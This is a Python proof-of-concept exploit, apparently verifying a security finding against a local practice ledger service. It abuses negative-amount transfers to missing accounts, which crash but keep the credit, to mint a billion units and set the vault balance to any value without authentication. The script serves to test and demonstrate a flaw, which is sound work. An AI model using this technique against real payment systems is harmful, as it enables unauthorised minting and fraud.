#!/usr/bin/env python3
"""PoC (proven-live step, F-7): scale mint + arbitrary ledger control.

Stronger than poc1_negative_amount_mint.py: the mint primitive is driven at
scale and turned into full ledger control - the attacker mints an arbitrary
amount onto a fresh-looking balance, then RESTORES the overdrawn vault to a
positive balance, i.e. every account balance in the ledger is writable by an
unauthenticated client.
EDUCATIONAL - run against the local practice target only.
Ladder  : in-code -> proven-live (this file). Exit 0 = reproduced.
"""
import http.client
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"
MINT_TARGET = 1_000_000_000


def post(src: str, dst: str, amount: int) -> dict | None:
    data = urllib.parse.urlencode({"from": src, "to": dst, "amount": amount}).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read().decode())
    except (urllib.error.URLError, http.client.HTTPException, ConnectionError, OSError):
        return None


def balances() -> dict:
    return post("vault", "vault", 0)["balances"]


def mint(src: str, total: int) -> int:
    """Mint `total` onto `src` in chunks (each chunk: one crashed request)."""
    minted = 0
    chunk = 10_000_000
    while minted < total:
        post(src, f"sink_{minted}", -chunk)  # unknown dst: crash, credit persists
        minted += chunk
    return minted


def main() -> int:
    before = balances()
    print(f"[read ] before: {before}")

    # 1. scale mint onto alice
    mint("alice", MINT_TARGET)
    mid = balances()
    gained = mid["alice"] - before["alice"]
    print(f"[mint ] minted {gained} units onto alice in crashed requests")

    # 2. ledger control: move the vault to an exact chosen positive value
    vault_target = 500_000
    delta = vault_target - mid["vault"]  # amount vault must GAIN
    if delta > 0:
        # credit vault by `delta`: negative amount + absent destination = crash
        post("vault", "rescue_sink_absent", -delta)
    elif delta < 0:
        # debit vault by `delta`: plain positive transfer (no balance check)
        post("vault", "bob", delta)
    after = balances()
    print(f"[ctrl ] vault driven to {after['vault']} (target {vault_target}) "
          f"by a {'negative-amount crashed transfer' if delta > 0 else 'plain transfer'}")

    ok = gained == MINT_TARGET and after["vault"] == vault_target
    if not ok:
        print("FAIL: ledger control not fully reproduced")
        return 1
    print("REPRODUCED: unauthenticated client minted 1,000,000,000 units and set "
          "the vault balance to an exact chosen value - the ledger is writable")
    print("--- transcript (ledger facts) ---")
    print(f"alice: {before['alice']} -> {after['alice']} (mint)")
    print(f"vault: {before['vault']} -> {after['vault']} (arbitrary write)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
